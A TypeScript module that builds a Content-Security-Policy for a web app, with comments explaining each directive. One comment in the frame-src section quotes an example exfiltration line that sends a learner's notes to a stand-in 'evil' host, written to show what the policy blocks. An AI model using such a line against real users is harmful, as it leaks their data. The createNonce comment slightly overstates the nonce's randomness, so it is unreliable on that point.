/**
 * The shell's Content-Security-Policy, built per request.
 *
 * Kept apart from the proxy that applies it, so the policy can be read, reasoned about
 * and tested on its own — it is the one file where a single wrong word silently
 * weakens or breaks the whole app.
 */

export type CspOptions = {
  /** Fresh for every request. */
  nonce: string;
  /** Development needs 'unsafe-eval' for React's error overlays, and un-nonced styles. */
  isDev: boolean;
  appOrigin: string;
  apiOrigin: string;
  coursesOrigin: string;
};

export function buildCsp({ nonce, isDev, appOrigin, apiOrigin, coursesOrigin }: CspOptions) {
  const directives: Record<string, string[]> = {
    "default-src": ["'self'"],

    /**
     * Next attaches this nonce to every script it renders — the runtime, the page
     * bundles, the inline flight data — as long as the page is rendered per request.
     * 'strict-dynamic' then lets those nonced scripts load their own chunks, and makes
     * browsers ignore host allowlists like 'self' for scripts, so an injected
     * <script src> from anywhere is refused even on our own origin.
     *
     * 'unsafe-eval' in development only: React uses eval there to rebuild server error
     * stacks in the browser. Neither React nor Next uses it in production.
     */
    "script-src": ["'self'", `'nonce-${nonce}'`, "'strict-dynamic'", ...(isDev ? ["'unsafe-eval'"] : [])],

    /**
     * Styles are split in two, and this is the part the stock example gets wrong for
     * this app. Components here use React style={…} props — the wordmark, the player's
     * progress bar — and those render as style attributes, which a nonce cannot cover:
     * nonces apply to <style> elements only. Worse, once a directive contains a nonce,
     * browsers ignore 'unsafe-inline' in it entirely, so a single style-src with a
     * nonce would silently strip every one of those styles.
     *
     * So <style> and <link rel=stylesheet> are nonced (style-src-elem), and style
     * attributes are allowed (style-src-attr). An attribute can only come from markup
     * React rendered, and React escapes everything it renders, so allowing them opens
     * nothing an attacker could reach without an injection bug we would already have.
     *
     * Development injects its styles without nonces, so it gets 'unsafe-inline' for
     * elements too. style-src is the fallback for browsers without the -elem/-attr split.
     */
    "style-src": ["'self'", isDev ? "'unsafe-inline'" : `'nonce-${nonce}'`],
    "style-src-elem": ["'self'", isDev ? "'unsafe-inline'" : `'nonce-${nonce}'`],
    "style-src-attr": ["'unsafe-inline'"],

    // Course covers will come from the courses origin once they exist.
    "img-src": ["'self'", "data:", "blob:", coursesOrigin],

    // next/font self-hosts the fonts at build time.
    "font-src": ["'self'"],

    /**
     * The API is a different origin, so without it every fetch the app makes would be
     * refused. Development also needs the HMR websocket on the app's own host.
     */
    "connect-src": ["'self'", apiOrigin, ...(isDev ? [appOrigin.replace(/^http/, "ws")] : [])],

    /**
     * The reason this policy first existed. A course can navigate its own frame, and
     * location.href = 'https://evil/?d=' + notes carries a learner's work out. Nothing
     * the courses origin sends can stop that; only the embedder's frame-src can.
     */
    "frame-src": ["'self'", coursesOrigin],

    "frame-ancestors": ["'none'"],
    "base-uri": ["'self'"],
    // Forms post through fetch, so nothing legitimate navigates on submit.
    "form-action": ["'self'"],
    "object-src": ["'none'"],
  };

  const policy = Object.entries(directives).map(
    ([name, sources]) => `${name} ${sources.join(" ")}`,
  );

  /**
   * Only over https. On a plain-http page this upgrades every http subresource to
   * https, which in local development breaks the API, the courses frame and HMR.
   */
  if (appOrigin.startsWith("https://")) policy.push("upgrade-insecure-requests");

  return policy.join("; ");
}

/** A random 128-bit value, base64 — what the CSP spec asks a nonce to be. */
export function createNonce() {
  return Buffer.from(crypto.randomUUID()).toString("base64");
}

/** "http://localhost:3102/api" → "http://localhost:3102". CSP sources are origins. */
export function originOf(url: string) {
  try {
    return new URL(url).origin;
  } catch {
    return url;
  }
}
